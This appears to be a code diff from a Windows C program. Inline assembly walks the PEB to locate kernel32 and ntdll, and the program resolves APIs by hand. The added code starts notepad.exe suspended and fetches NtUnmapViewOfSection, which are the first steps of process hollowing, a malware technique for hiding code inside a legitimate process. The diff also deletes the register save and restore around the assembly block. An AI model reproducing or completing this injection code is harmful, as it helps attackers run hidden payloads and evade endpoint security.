@@ -18,7 +18,7 @@ DWORD kernel32_base, ntdll_base;
 void Kernel32_NTdll_bases()
 {
 	__asm {
-		pushad
+		
 		xor eax , eax
 		mov eax , fs:[eax + 0x30] //PEB
 		mov eax , [eax+0xc] // pointer LDR 
@@ -29,7 +29,7 @@ void Kernel32_NTdll_bases()
 		mov eax , [eax] // kernel32.dll
 		mov ecx , [eax+0x10]
 		mov [kernel32_base] , ecx // image base of kernel32.dll
-		popad
+		
 	}
 
 }
@@ -94,10 +94,19 @@ DWORD find_function_address(DWORD base , char * function_name)
 int wmain()
 {
 	Kernel32_NTdll_bases();
-	  
-	_NtUnmapViewOfSection NtUnmapViewOfSe = find_function_address(ntdll_base, "NtUnmapViewOfSection");
-	_NtUnmapViewOfSection NtUnmapViewOfTrue = GetProcAddr(ntdll_base, "NtUnmapViewOfSection");
+	 
+	STARTUPINFOA blah;
+	PROCESS_INFORMATION blah1; 
+	ZeroMemory(&blah, sizeof(blah));
 
-	printf("_NtUnmapViewOfSection at @0x%x", NtUnmapViewOfSe); 
+	_CreateProcessA _CreateProc = find_function_address(kernel32_base, "CreateProcessA");
+	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\SysWOW64\\notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
+		printf("error creating this trash process bye , %d!\n",GetLastError());
+		exit(1); 
+	}
+	
+	
+	_NtUnmapViewOfSection NtUnmapViewOfSe = find_function_address(ntdll_base, "NtUnmapViewOfSection");
+	printf("_NtUnmapViewOfSection @ 0x%x", NtUnmapViewOfSe); 
 	//printf("ntdll base : @0x%x\nkernel32_Base : @0x%x\n", ntdll_base ,kernel32_base);
 }
